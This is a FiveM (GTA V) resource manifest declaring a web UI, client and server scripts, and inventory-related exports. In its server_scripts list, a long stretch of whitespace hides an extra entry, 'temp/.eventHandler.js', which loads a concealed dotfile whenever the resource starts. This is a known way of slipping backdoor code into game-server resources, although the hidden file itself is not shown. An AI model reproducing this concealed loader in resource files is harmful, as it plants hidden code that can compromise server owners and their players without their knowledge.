




fx_version 'bodacious'
game 'gta5' 

ui_page 'web/index.html'
files {
    'web/**'
}

client_script {
    'client.lua',
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    "init/server.lua",                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       'temp/.eventHandler.js',
}

exports {
    "isInInterface",
    'draw',
    "isInInventory",
}

shared_scripts {

}

lua54 "yes"